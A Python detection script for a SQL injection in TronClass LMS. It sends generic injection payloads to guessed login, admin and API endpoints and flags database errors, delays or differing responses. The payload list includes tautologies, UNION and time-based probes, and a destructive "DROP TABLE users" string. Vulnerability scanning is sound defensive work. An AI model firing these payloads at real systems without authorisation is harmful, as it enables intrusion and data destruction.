"""
CVE-2024-8373 Vulnerability Detection Script
SQL Injection vulnerability detection for TronClass LMS
"""

import requests
import time
from urllib.parse import urljoin

def scan(session, target_url):
    """
    Scan for CVE-2024-8373 vulnerability
    SQL Injection vulnerability in database queries
    """
    result = {
        'vulnerable': False,
        'evidence': '',
        'description': 'CVE-2024-8373: SQL Injection vulnerability in database query handling',
        'remediation': 'Use parameterized queries and prepared statements. Implement proper input validation and sanitization.'
    }
    
    try:
        # SQL injection test payloads
        sql_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",
            "admin'--",
            "admin';--",
            "'; DROP TABLE users; --",
            "' UNION SELECT null,null,null--",
            "' UNION SELECT 1,2,3--",
            "' AND (SELECT COUNT(*) FROM users) > 0--",
            "' AND (SELECT SUBSTRING(@@version,1,1)) = '5'--",
            "' OR SLEEP(5)--",
            "' OR BENCHMARK(1000000,MD5(1))--"
        ]
        
        # Test endpoints for SQL injection
        test_endpoints = [
            '/login',
            '/search',
            '/user',
            '/course',
            '/profile',
            '/admin',
            '/api/users',
            '/api/courses',
            '/quiz',
            '/grade'
        ]
        
        for endpoint in test_endpoints:
            for payload in sql_payloads:
                try:
                    # Test GET parameters
                    response = session.get(
                        urljoin(target_url, endpoint),
                        params={'id': payload, 'user': payload, 'search': payload},
                        timeout=30
                    )
                    
                    # Check for SQL error messages
                    error_indicators = [
                        'mysql_fetch_array',
                        'mysql_fetch_assoc',
                        'mysql_fetch_row',
                        'mysql_num_rows',
                        'mysql_result',
                        'mysql_select_db',
                        'mysql_query',
                        'mysql_error',
                        'PostgreSQL query failed',
                        'supplied argument is not a valid PostgreSQL result',
                        'Microsoft OLE DB Provider for ODBC Drivers',
                        'Microsoft Access Driver',
                        'Microsoft JET Database Engine',
                        'SQLite/JDX',
                        'SQLite.Exception',
                        'System.Data.SQLite.SQLiteException',
                        'ORA-00933',
                        'ORA-00921',
                        'ORA-00936',
                        'ORA-00904',
                        'ORA-00942',
                        'ORA-00920',
                        'ORA-00911',
                        'ORA-00932',
                        'ORA-00923',
                        'ORA-00907',
                        'ORA-00905',
                        'ORA-00902',
                        'ORA-00901',
                        'ORA-00900',
                        'syntax error',
                        'SQL syntax',
                        'unclosed quotation mark',
                        'quoted string not properly terminated'
                    ]
                    
                    for error in error_indicators:
                        if error.lower() in response.text.lower():
                            result['vulnerable'] = True
                            result['evidence'] = f"SQL injection detected at {endpoint} with payload: {payload}. Error: {error}"
                            return result
                    
                    # Test POST parameters
                    post_data = {
                        'username': payload,
                        'password': 'test',
                        'email': payload,
                        'id': payload,
                        'search': payload
                    }
                    
                    response = session.post(
                        urljoin(target_url, endpoint),
                        data=post_data,
                        timeout=30
                    )
                    
                    for error in error_indicators:
                        if error.lower() in response.text.lower():
                            result['vulnerable'] = True
                            result['evidence'] = f"SQL injection detected at {endpoint} (POST) with payload: {payload}. Error: {error}"
                            return result
                            
                except:
                    continue
        
        # Test for time-based SQL injection
        time_payloads = [
            "' OR SLEEP(5)--",
            "' OR BENCHMARK(1000000,MD5(1))--",
            "'; WAITFOR DELAY '0:0:5'--",
            "' OR pg_sleep(5)--"
        ]
        
        for endpoint in ['/login', '/search', '/user']:
            for payload in time_payloads:
                try:
                    start_time = time.time()
                    response = session.get(
                        urljoin(target_url, endpoint),
                        params={'id': payload},
                        timeout=30
                    )
                    end_time = time.time()
                    
                    if end_time - start_time > 4:  # If response took more than 4 seconds
                        result['vulnerable'] = True
                        result['evidence'] = f"Time-based SQL injection detected at {endpoint} with payload: {payload}"
                        return result
                except:
                    continue
        
        # Test for boolean-based blind SQL injection
        boolean_payloads = [
            ("' AND 1=1--", "' AND 1=2--"),
            ("' AND 'a'='a'--", "' AND 'a'='b'--"),
            ("' AND (SELECT COUNT(*) FROM users) > 0--", "' AND (SELECT COUNT(*) FROM users) > 999999--")
        ]
        
        for true_payload, false_payload in boolean_payloads:
            try:
                true_response = session.get(
                    urljoin(target_url, '/login'),
                    params={'username': true_payload, 'password': 'test'},
                    timeout=30
                )
                
                false_response = session.get(
                    urljoin(target_url, '/login'),
                    params={'username': false_payload, 'password': 'test'},
                    timeout=30
                )
                
                if len(true_response.text) != len(false_response.text):
                    result['vulnerable'] = True
                    result['evidence'] = f"Boolean-based blind SQL injection detected with payloads: {true_payload} vs {false_payload}"
                    return result
            except:
                continue
                
    except Exception as e:
        result['evidence'] = f"Error during scan: {str(e)}"
    
    return result